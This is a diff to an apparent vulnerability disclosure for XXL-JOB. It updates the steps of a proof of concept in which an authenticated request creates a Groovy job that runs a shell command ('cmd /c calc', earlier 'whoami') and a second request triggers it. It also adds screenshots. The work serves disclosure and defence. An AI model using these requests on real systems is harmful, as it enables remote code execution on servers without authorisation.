@@ -115,7 +115,7 @@ jobGroup=1&jobDesc=RCE-Test&author=test&scheduleType=NONE&scheduleConf=&misfireS
 import com.xxl.job.core.context.XxlJobHelper
 class DemoJobHandler extends IJobHandler {
     public void execute() throws Exception {
-        def proc = ["cmd", "/c", "whoami"].execute()
+        def proc = ["cmd", "/c", "calc"].execute()
         XxlJobHelper.handleSuccess(proc.text)
     }
 }&glueRemark=RCE Test
@@ -123,8 +123,11 @@ class DemoJobHandler extends IJobHandler {
 
 **Response**:
 ```json
-{"code":200,"data":"7","msg":"Success","success":true}
+{"code":200,"data":"9","msg":"Success","success":true}
 ```
+
+<img width="1505" height="440" alt="图片" src="https://github.com/user-attachments/assets/e4d86765-b4be-4221-9c30-eab4534d77b0" />
+
 
 ### Step 3: Trigger the Job
 
@@ -134,13 +137,14 @@ Host: target:8080
 Cookie: xxl_job_login_token=<session_token>
 Content-Type: application/x-www-form-urlencoded
 
-id=7&executorParam=&addressList=
+id=9&executorParam=&addressList=
 ```
 
 **Response**:
 ```json
 {"code":200,"data":null,"msg":"Success","success":true}
 ```
+<img width="1536" height="676" alt="图片" src="https://github.com/user-attachments/assets/375111c6-ebd9-4191-99b3-8d5b672e8f32" />
 
 ---
 
